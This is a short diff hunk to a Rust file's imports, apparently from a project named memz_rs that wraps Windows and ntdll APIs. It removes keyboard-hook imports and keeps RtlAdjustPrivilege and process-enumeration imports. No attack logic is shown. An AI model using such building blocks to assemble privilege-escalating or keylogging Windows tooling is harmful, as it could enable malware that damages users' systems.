@@ -3,22 +3,16 @@ use memz_rs::{
     ntdll::{library::Library, ntdll_api::RtlAdjustPrivilegeFn},
     wrap_windows_api::{
         lstrcmp_w, wrap_close_handle, wrap_create_toolhelp32_snapshot, wrap_get_proc_address,
-        wrap_get_process_image_filename_a, wrap_load_library_a, wrap_process32_next,
-        wrap_set_windows_hook_ex_a, Resolution,
+        wrap_get_process_image_filename_a, wrap_load_library_a, wrap_process32_next, Resolution,
     },
     LMEM_ZEROINIT,
 };
-use std::{
-    mem::size_of,
-    ptr, slice,
-    sync::atomic::{AtomicBool, Ordering},
-};
+use std::{mem::size_of, ptr, slice};
 use windows::{
     core::{strlen, wcslen, PCSTR, PCWSTR},
     Win32::{
-        Foundation::{HMODULE, INVALID_HANDLE_VALUE, LPARAM, LRESULT, NTSTATUS, WPARAM},
+        Foundation::NTSTATUS,
         System::Diagnostics::ToolHelp::{Process32First, PROCESSENTRY32},
-        UI::WindowsAndMessaging::{CallNextHookEx, HHOOK, WH_KEYBOARD_LL},
     },
 };
 
